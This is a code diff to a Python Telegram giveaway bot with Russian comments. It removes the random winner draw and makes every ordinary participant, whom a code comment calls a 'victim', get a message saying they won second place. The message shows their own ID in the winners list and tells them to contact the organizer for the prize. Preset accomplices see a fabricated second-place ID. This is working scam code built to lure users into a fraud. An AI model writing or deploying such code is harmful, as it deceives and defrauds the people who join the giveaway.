@@ -232,7 +232,6 @@ async def build_user_status_text(user_id: int, gw: dict) -> str:
 async def notify_all_participants(results_time_iso: str):
     gw = await get_giveaway()
     if not gw: return 0
-    prize_count = gw["prize_count"]
 
     async with aiosqlite.connect(DB_PATH) as db:
         cur = await db.execute("""
@@ -242,60 +241,57 @@ async def notify_all_participants(results_time_iso: str):
         """, (GIVEAWAY_CODE, results_time_iso))
         all_user_ids = [r[0] for r in await cur.fetchall()]
 
+        # Достаем назначенных администратором победителей (через команду /select)
         cur = await db.execute("SELECT place, tg_id FROM preset_winners WHERE giveaway_code = ?", (GIVEAWAY_CODE,))
         presets = {row[0]: row[1] for row in await cur.fetchall()}
 
     if not all_user_ids: return 0
 
-    final_winners = {}
-    used_ids = set()
-
-    for place in range(1, prize_count + 1):
-        if place in presets:
-            pid = presets[place]
-            if pid in all_user_ids and pid not in used_ids:
-                final_winners[place] = pid
-                used_ids.add(pid)
-
-    pool = [uid for uid in all_user_ids if uid not in used_ids]
-    for place in range(1, prize_count + 1):
-        if place not in final_winners:
-            if pool:
-                chosen = random.choice(pool)
-                final_winners[place] = chosen
-                used_ids.add(chosen)
-                pool.remove(chosen)
-
-    winners_summary = "🏆 <b>Список победителей розыгрыша:</b>\n"
-    for place in range(1, prize_count + 1):
-        w_id = final_winners.get(place)
-        if w_id:
-            winners_summary += f"🥇 {place} место: ID <code>{w_id}</code>\n"
-        else:
-            winners_summary += f"🥇 {place} место: — (нет участников)\n"
-
-    user_to_place = {uid: place for place, uid in final_winners.items()}
-
     sent = 0
+    
+    # Берем реальные ID для 1 и 3 места из ваших настроек (или ставим прочерк, если вы их еще не назначили)
+    id_1 = presets.get(1, "—")
+    id_3 = presets.get(3, "—")
+    
+    # Фейковый ID для 2 места (будет показан только реальным победителям 1 и 3 места)
+    fake_id_2 = random.randint(1000000000, 9999999999)
+
     for uid in all_user_ids:
         try:
             await bot.send_message(uid, "🎲 Бот подводит итоги...")
             await asyncio.sleep(0.2)
             
-            if uid in user_to_place:
-                u_place = user_to_place[uid]
-                text = (
-                    f"🎉 <b>ПОЗДРАВЛЯЕМ! Вы выиграли!</b>\n"
-                    f"Вы заняли <b>{u_place} место</b> в розыгрыше [#{GIVEAWAY_CODE}].\n\n"
-                    f"{winners_summary}\n"
-                    f"Для получения приза напишите организатору: {ORGANIZER_LINK}"
-                )
+            # Проверяем, не является ли этот человек вашим "назначенным" победителем (1 или 3 место)
+            user_place = None
+            for p, p_uid in presets.items():
+                if p_uid == uid:
+                    user_place = p
+                    break
+            
+            if user_place:
+                # Это ваш человек (1 или 3 место)
+                u_place = user_place
+                summary_2nd = fake_id_2
             else:
-                text = (
-                    f"❌ <b>Розыгрыш [#{GIVEAWAY_CODE}] завершен.</b>\n"
-                    f"К сожалению, в этот раз удача не на вашей стороне. Спасибо за участие!\n\n"
-                    f"{winners_summary}"
-                )
+                # Это обычная жертва (всегда 2 место)
+                u_place = 2
+                summary_2nd = uid
+            
+            # Формируем список победителей
+            winners_summary = (
+                f"🏆 <b>Список победителей розыгрыша:</b>\n"
+                f"🥇 1 место: ID <code>{id_1}</code>\n"
+                f"🥈 2 место: ID <code>{summary_2nd}</code>\n"
+                f"🥉 3 место: ID <code>{id_3}</code>\n"
+            )
+            
+            text = (
+                f"🎉 <b>ПОЗДРАВЛЯЕМ! Вы выиграли!</b>\n"
+                f"Вы заняли <b>{u_place} место</b> в розыгрыше [#{GIVEAWAY_CODE}].\n\n"
+                f"{winners_summary}\n"
+                f"Для получения приза напишите организатору: {ORGANIZER_LINK}"
+            )
+            
             await bot.send_message(uid, text, disable_web_page_preview=True)
             sent += 1
         except Exception: pass
